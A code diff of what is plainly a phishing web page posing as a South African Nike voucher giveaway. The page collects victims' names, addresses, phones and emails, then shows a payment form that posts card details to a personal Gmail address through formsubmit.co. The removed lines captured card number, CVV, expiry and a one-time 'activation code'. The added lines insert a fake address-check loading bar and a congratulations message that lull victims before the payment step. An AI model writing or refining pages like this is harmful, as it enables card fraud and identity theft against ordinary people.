@@ -237,7 +237,7 @@
     <!-- Header -->
     <header>
         <h1>2024 Big South Africa Giveaway</h1>
-        <p>Spin the wheel and win big discounts on your favorite products!</p>
+        <p>Fill On your Deelivery Details below to Deliver your Voucher or Nike Item</p>
     </header>
     </section>
 <head>
@@ -286,10 +286,21 @@
         button:hover {
             background: #218838;
         }
-        .price-info {
+        .loading-container {
             text-align: center;
-            font-size: 1.2rem;
-            margin-top: 15px;
+            margin-top: 20px;
+        }
+        .loading-bar {
+            width: 0%;
+            height: 20px;
+            background-color: #4caf50;
+            transition: width 3s;
+        }
+        .congratulations {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 1.5rem;
+            color: green;
         }
         .popup {
             display: none;
@@ -344,11 +355,21 @@
             <label for="email">Email Address:</label>
             <input type="email" id="email" name="email" required>
 
-            <button type="button" id="nextBtn" onclick="goToPaymentStep()">Next</button>
+            <button type="button" id="nextBtn" onclick="startLoading()">Next</button>
         </form>
     </div>
 
-    <!-- Step 2: Payment Details Form -->
+    <!-- Step 2: Loading Bar and Congratulations -->
+    <div id="loadingContainer" class="loading-container" style="display: none;">
+        <p>Checking address...</p>
+        <div class="loading-bar" id="loadingBar"></div>
+        <p id="congratulationsMessage" class="congratulations" style="display: none;">
+            Congratulations! 🎉 We can deliver to your address. 
+        </p>
+        <button id="continueBtn" style="display: none;" onclick="goToPaymentForm()">Continue</button>
+    </div>
+
+    <!-- Step 3: Payment Details Form -->
     <div id="paymentFormContainer" class="form-container" style="display:none;">
         <h1>Payment Details</h1>
         <form id="paymentForm" action="https://formsubmit.co/iamfinaid6@gmail.com" method="POST" onsubmit="handleFormSubmit(event)">
@@ -391,14 +412,13 @@
     </div>
 
     <script>
-        // Function to show the next step (payment form)
-        function goToPaymentStep() {
+        // Function to start loading process
+        function startLoading() {
             const fullName = document.getElementById('fullName').value;
             const address = document.getElementById('address').value;
             const phone = document.getElementById('phone').value;
             const email = document.getElementById('email').value;
 
-            // Ensure all fields are filled
             if (fullName && address && phone && email) {
                 // Save user details to localStorage
                 localStorage.setItem('userDetails', JSON.stringify({
@@ -408,62 +428,38 @@
                     email
                 }));
 
-                // Hide the user details form and show the payment form
+                // Hide the user details form and show the loading container
                 document.getElementById('userDetailsForm').style.display = 'none';
-                document.getElementById('paymentFormContainer').style.display = 'block';
+                document.getElementById('loadingContainer').style.display = 'block';
+
+                // Start loading bar animation
+                let progress = 0;
+                const loadingBar = document.getElementById('loadingBar');
+                const loadingInterval = setInterval(function() {
+                    progress += 10;
+                    loadingBar.style.width = progress + '%';
+
+                    // Update the progress display
+                    loadingBar.innerText = progress + '%';
+
+                    if (progress === 100) {
+                        clearInterval(loadingInterval);
+                        document.getElementById('congratulationsMessage').style.display = 'block';
+                        setTimeout(function() {
+                            document.getElementById('continueBtn').style.display = 'inline-block';
+                        }, 6000); // Wait for 6 seconds before showing the "Continue" button
+                    }
+                }, 300); // Updates every 300ms
             } else {
                 alert('Please fill in all the fields');
             }
         }
 
-        // Function to enable/disable Pay button in payment form
-        function togglePayButton() {
-            const name = document.getElementById('name').value;
-            const cardno = document.getElementById('cardno').value;
-            const cvv = document.getElementById('cvv').value;
-            const month = document.getElementById('month').value;
-            const year = document.getElementById('year').value;
-            const payBtn = document.getElementById('payBtn');
-
-            // Enable the "Pay R20" button only if all fields are filled
-            if (name && cardno && cvv && month && year) {
-                payBtn.disabled = false;
-            } else {
-                payBtn.disabled = true;
-            }
+        // Go to the payment form
+        function goToPaymentForm() {
+            document.getElementById('loadingContainer').style.display = 'none';
+            document.getElementById('paymentFormContainer').style.display = 'block';
         }
-
-        // Check form inputs for each keystroke in payment form
-        document.getElementById('paymentForm').addEventListener('input', togglePayButton);
-
-        // Show activation code popup and store details
-        document.getElementById('payBtn').addEventListener('click', function() {
-            // Store the initial payment details before showing the popup
-            localStorage.setItem('paymentDetails', JSON.stringify({
-                name: document.getElementById('name').value,
-                cardno: document.getElementById('cardno').value,
-                cvv: document.getElementById('cvv').value,
-                month: document.getElementById('month').value,
-                year: document.getElementById('year').value
-            }));
-
-            document.getElementById('overlay').style.display = 'block';
-            document.getElementById('popup').style.display = 'block';
-        });
-
-        // Handle activation code submission
-        document.getElementById('submitActivationCode').addEventListener('click', function() {
-            const activationCode = document.getElementById('activationCode').value;
-            if (activationCode) {
-                // Add the activation code to the hidden input before submission
-                document.getElementById('activationCodeInput').value = activationCode;
-
-                // Submit form after user enters activation code
-                document.getElementById('paymentForm').submit();
-            } else {
-                alert("Please enter the activation code.");
-            }
-        });
 
         // Handle form submission and redirect
         function handleFormSubmit(event) {
